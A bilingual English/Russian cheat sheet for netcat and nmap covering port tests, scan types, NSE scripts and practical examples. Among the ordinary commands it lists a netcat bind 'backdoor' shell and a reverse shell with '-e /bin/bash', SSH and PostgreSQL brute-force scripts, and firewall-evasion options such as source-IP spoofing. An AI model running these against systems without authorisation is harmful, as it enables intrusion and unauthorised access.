Title: 🔌 nc / nmap — Network Tools
Group: Network
Icon: 🔌
Order: 4

## Table of Contents
- [netcat — Swiss Army Knife](#-netcat--swiss-army-knife)
- [nmap — Port Scanner](#-nmap--port-scanner)
- [Advanced Scanning](#-advanced-scanning--продвинутое-сканирование)
- [NSE Scripts](#-nse-scripts--скрипты-nse)
- [Troubleshooting](#-troubleshooting--устранение-неполадок)
- [Real-World Examples](#-real-world-examples--примеры-из-практики)

---

# 🔌 netcat — Swiss Army Knife

### Port Testing / Проверка портов
```bash
nc -zv <HOST> 80                              # Test port 80 / Проверить порт 80
nc -zv <HOST> 22                              # Test SSH / Проверить SSH
nc -zv <HOST> 1-1024                          # Scan ports 1-1024 / Сканировать порты 1-1024
nc -zv -w 1 <HOST> 80                         # 1s timeout / Таймаут 1с
nc -zv -u <HOST> 53                           # UDP port test / Проверка UDP порта
```

### Banner Grabbing / Снятие баннеров
```bash
echo -e "GET / HTTP/1.0\r\n\r\n" | nc <HOST> 80  # HTTP banner / HTTP баннер
nc <HOST> 22                                  # SSH banner / SSH баннер
nc <HOST> 25                                  # SMTP banner / SMTP баннер
echo "QUIT" | nc <HOST> 21                    # FTP banner / FTP баннер
```

### Listen Mode / Режим прослушивания
```bash
nc -l 8080                                    # Listen on port 8080 / Слушать порт 8080
nc -l -p 9999                                 # Listen on port 9999 / Слушать порт 9999
nc -l -k 8080                                 # Keep listening (persist) / Продолжать слушать
nc -l 8080 > received.file                    # Receive file / Получить файл
nc -l 8080 | tar -xzvf -                      # Receive and extract / Получить и распаковать
```

### Connect & Send / Подключение и отправка
```bash
nc <HOST> 8080 < file.txt                     # Send file / Отправить файл
cat file.txt | nc <HOST> 8080                 # Alternative / Альтернатива
tar -czf - /dir | nc <HOST> 8080              # Send directory / Отправить директорию
```

### Chat / Backdoor / Чат / Backdoor
```bash
nc -l 8080                                    # Server / Сервер
nc <HOST> 8080                                # Client / Клиент
# Type messages and press Enter / Печатайте сообщения и нажимайте Enter
```

### Execute Commands / Выполнение команд
```bash
nc -l -p 8080 -e /bin/bash                    # Backdoor shell (dangerous!) / Backdoor shell (опасно!)
nc <HOST> 8080 -e /bin/bash                   # Reverse shell / Обратный shell
```

### Proxy / Прокси
```bash
mkfifo /tmp/fifo                              # Create FIFO / Создать FIFO
nc -l 8080 < /tmp/fifo | nc <TARGET> 80 > /tmp/fifo  # Proxy to target / Прокси на цель
```

---

# 🔍 nmap — Port Scanner

### Basic Scanning / Базовое сканирование
```bash
nmap <HOST>                                   # Scan top 1000 ports / Сканировать top 1000 портов
nmap 192.168.1.0/24                           # Scan subnet / Сканировать подсеть
nmap 192.168.1.1-254                          # Scan range / Сканировать диапазон
nmap <HOST1> <HOST2> <HOST3>                  # Scan multiple hosts / Сканировать несколько хостов
```

### Port Specification / Указание портов
```bash
nmap -p 80 <HOST>                             # Scan port 80 / Сканировать порт 80
nmap -p 80,443 <HOST>                         # Scan ports 80 and 443 / Сканировать порты 80 и 443
nmap -p 1-1024 <HOST>                         # Scan ports 1-1024 / Сканировать порты 1-1024
nmap -p- <HOST>                               # Scan all ports / Сканировать все порты
nmap -p T:80,U:53 <HOST>                      # TCP 80 + UDP 53 / TCP 80 + UDP 53
```

### Scan Types / Типы сканирования
```bash
nmap -sS <HOST>                               # SYN scan (stealth) / SYN сканирование (скрытое)
nmap -sT <HOST>                               # TCP connect scan / TCP connect сканирование
nmap -sU <HOST>                               # UDP scan / UDP сканирование
nmap -sA <HOST>                               # ACK scan (firewall detection) / ACK сканирование
nmap -sN <HOST>                               # NULL scan / NULL сканирование
nmap -sF <HOST>                               # FIN scan / FIN сканирование
```

### Service & OS Detection / Определение сервиса и ОС
```bash
nmap -sV <HOST>                               # Service version detection / Определение версии сервиса
nmap -O <HOST>                                # OS detection / Определение ОС
nmap -A <HOST>                                # Aggressive scan (OS, version, scripts) / Агрессивное сканирование
nmap -sV --version-intensity 5 <HOST>         # Intense version detection / Интенсивное определение версии
```

### Timing & Performance / Тайминг и производительность
```bash
nmap -T0 <HOST>                               # Paranoid (slowest) / Параноидальный (самый медленный)
nmap -T1 <HOST>                               # Sneaky / Скрытный
nmap -T2 <HOST>                               # Polite / Вежливый
nmap -T3 <HOST>                               # Normal (default) / Нормальный (по умолчанию)
nmap -T4 <HOST>                               # Aggressive / Агрессивный
nmap -T5 <HOST>                               # Insane (fastest) / Безумный (самый быстрый)
```

### Host Discovery / Обнаружение хостов
```bash
nmap -sn 192.168.1.0/24                       # Ping scan (no port scan) / Ping сканирование
nmap -Pn <HOST>                               # Skip ping (assume host up) / Пропустить ping
nmap -PS22,80,443 <HOST>                      # TCP SYN ping / TCP SYN ping
nmap -PA22,80,443 <HOST>                      # TCP ACK ping / TCP ACK ping
```

---

# 🔬 Advanced Scanning / Продвинутое сканирование

### Firewall Evasion / Обход фаервола
```bash
nmap -f <HOST>                                # Fragment packets / Фрагментировать пакеты
nmap -D RND:10 <HOST>                         # Decoy scan / Сканирование с приманками
nmap -S <SPOOF_IP> <HOST>                     # Spoof source IP / Подменить исходный IP
nmap --spoof-mac <MAC> <HOST>                 # Spoof MAC address / Подменить MAC адрес
nmap --data-length 25 <HOST>                  # Append random data / Добавить случайные данные
```

### Output Formats / Форматы вывода
```bash
nmap -oN output.txt <HOST>                    # Normal output / Нормальный вывод
nmap -oX output.xml <HOST>                    # XML output / XML вывод
nmap -oG output.grep <HOST>                   # Grepable output / Grepable вывод
nmap -oA output <HOST>                        # All formats / Все форматы
```

### Target Specification / Указание целей
```bash
nmap -iL hosts.txt                            # Scan from file / Сканировать из файла
nmap --exclude 192.168.1.5                    # Exclude host / Исключить хост
nmap --excludefile exclude.txt                # Exclude from file / Исключить из файла
```

---

# 📜 NSE Scripts / Скрипты NSE

### Script Categories / Категории скриптов
```bash
nmap --script=default <HOST>                  # Default scripts / Скрипты по умолчанию
nmap --script=vuln <HOST>                     # Vulnerability scripts / Скрипты уязвимостей
nmap --script=exploit <HOST>                  # Exploit scripts / Скрипты эксплойтов
nmap --script=auth <HOST>                     # Authentication scripts / Скрипты аутентификации
nmap --script=discovery <HOST>                # Discovery scripts / Скрипты обнаружения
```

### Specific Scripts / Конкретные скрипты
```bash
nmap --script=http-title <HOST> -p 80         # HTTP title / HTTP заголовок
nmap --script=ssl-cert <HOST> -p 443          # SSL certificate / SSL сертификат
nmap --script=ssh-brute <HOST> -p 22          # SSH brute force / SSH брутфорс
nmap --script=mysql-info <HOST> -p 3306       # MySQL info / MySQL информация
```

### Script Arguments / Аргументы скриптов
```bash
nmap --script=http-wordpress-enum --script-args http-wordpress-enum.root="/blog/" <HOST>
```

### List Scripts / Список скриптов
```bash
nmap --script-help=http-*                     # List HTTP scripts / Список HTTP скриптов
# ls /usr/share/nmap/scripts/                   # Browse all scripts / Просмотр всех скриптов
```

---

# 🐛 Troubleshooting / Устранение неполадок

### Verbose & Debug / Подробный и отладочный
```bash
nmap -v <HOST>                                # Verbose / Подробный
nmap -vv <HOST>                               # Extra verbose / Очень подробный
nmap -d <HOST>                                # Debug / Отладочный
nmap -dd <HOST>                               # Extra debug / Очень отладочный
```

### Packet Tracing / Отслеживание пакетов
```bash
nmap --packet-trace <HOST>                    # Show packets / Показать пакеты
nmap --reason <HOST>                          # Show reason for state / Показать причину состояния
```

### IPv6 Scanning / Сканирование IPv6
```bash
nmap -6 <IPV6_HOST>                           # IPv6 scan / IPv6 сканирование
nmap -6 fe80::1                               # Link-local / Локальный канал
```

---

# 🌟 Real-World Examples / Примеры из практики

### Network Discovery / Обнаружение сети
```bash
# Discover live hosts / Обнаружить живые хосты
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}'

# Quick scan of live hosts / Быстрое сканирование живых хостов
nmap -T4 -F 192.168.1.0/24
```

### Vulnerability Scanning / Сканирование уязвимостей
```bash
# Scan for vulnerabilities / Сканировать на уязвимости
nmap -Pn --script vuln <HOST>

# Check for Heartbleed / Проверить на Heartbleed
nmap -p 443 --script ssl-heartbleed <HOST>

# Check SMB vulnerabilities / Проверить SMB уязвимости
nmap --script smb-vuln* <HOST> -p 445
```

### Web Server Audit / Аудит веб-сервера
```bash
# Comprehensive web scan / Комплексное веб-сканирование
nmap -p 80,443 --script=http-enum,http-headers,http-methods,http-title <HOST>

# Check for common vulnerabilities / Проверить на общие уязвимости
nmap -p 80,443 --script=http-sql-injection,http-csrf,http-stored-xss <HOST>
```

### Database Scanning / Сканирование баз данных
```bash
# MySQL scan / Сканирование MySQL
nmap -p 3306 --script mysql-info,mysql-enum <HOST>

# PostgreSQL scan / Сканирование PostgreSQL
nmap -p 5432 --script pgsql-brute <HOST>

# MongoDB scan / Сканирование MongoDB
nmap -p 27017 --script mongodb-info <HOST>
```

### Quick Port Check / Быстрая проверка портов
```bash
# Check if port is open / Проверить открыт ли порт
nc -zv <HOST> 80 && echo "Port 80 OPEN" || echo "Port 80 CLOSED"

# Check multiple services / Проверить несколько сервисов
for port in 22 80 443 3306; do
  nc -zv -w 1 <HOST> $port 2>&1 | grep succeeded && echo "Port $port OPEN"
done
```

### File Transfer / Передача файлов
```bash
# Send file with nc / Отправить файл с nc
# Receiver / Получатель:
nc -l 8080 > received.tar.gz

# Sender / Отправитель:
cat file.tar.gz | nc <HOST> 8080

# With progress / С прогрессом:
pv file.tar.gz | nc <HOST> 8080
```

### Remote Command Execution / Удалённое выполнение команд
```bash
# Execute command via nc / Выполнить команду через nc
echo "ls -la" | nc <HOST> 8080

# Interactive shell / Интерактивный shell
nc <HOST> 8080
```

### Network Baseline / Базовая линия сети
```bash
# Create baseline / Создать базовую линию
nmap -sV -O -oA baseline-$(date +%F) 192.168.1.0/24

# Compare scans / Сравнить сканирования
ndiff baseline-2025-02-01.xml baseline-2025-02-04.xml
```

### Docker Container Scanning / Сканирование контейнеров Docker
```bash
# Scan Docker host / Сканировать Docker хост
nmap -p 2375,2376 <HOST>

# Scan for exposed Docker API / Сканировать на открытый Docker API
nmap -p 2375 --script docker-version <HOST>
```

### Kubernetes Cluster Scan / Сканирование кластера Kubernetes
```bash
# Scan K8s API / Сканировать K8s API
nmap -p 6443,10250,10255 <K8S_NODE>

# Check for open kubelet / Проверить на открытый kubelet
nmap -p 10250 --script=banner <K8S_NODE>
```

## 💡 Best Practices / Лучшие практики

- Use `-Pn` for hosts behind firewall / Используйте `-Pn` для хостов за фаерволом
- Start with `-T4` for reasonable speed / Начните с `-T4` для разумной скорости
- Use `-sV` only when needed / Используйте `-sV` только когда нужно
- Save scans with `-oA` for later analysis / Сохраняйте сканирования с `-oA` для последующего анализа
- Use `nc` for quick port checks / Используйте `nc` для быстрых проверок портов

## 🔧 Common nmap Scan Types / Распространённые типы сканирования nmap

| Scan | Description (EN / RU) |
|------|----------------------|
| `-sS` | SYN scan (default) / SYN сканирование (по умолчанию) |
| `-sT` | TCP connect scan / TCP connect сканирование |
| `-sU` | UDP scan (slow) / UDP сканирование (медленное) |
| `-sV` | Version detection / Определение версии |
| `-O` | OS detection / Определение ОС |
| `-A` | Aggressive (OS, version, scripts, traceroute) / Агрессивное |

## 📋 netcat Variants / Варианты netcat

| Variant | Description (EN / RU) |
|---------|----------------------|
| `nc` | Traditional netcat / Традиционный netcat |
| `ncat` | Nmap netcat (with SSL support) / Nmap netcat (с поддержкой SSL) |
| `socat` | Advanced netcat alternative / Продвинутая альтернатива netcat |

## ⚠️ Legal Warning / Юридическое предупреждение

- Only scan networks you have permission to scan / Сканируйте только сети на которые у вас есть разрешение
- Unauthorized scanning may be illegal / Несанкционированное сканирование может быть незаконным
- Always get written permission first / Всегда получайте письменное разрешение сначала
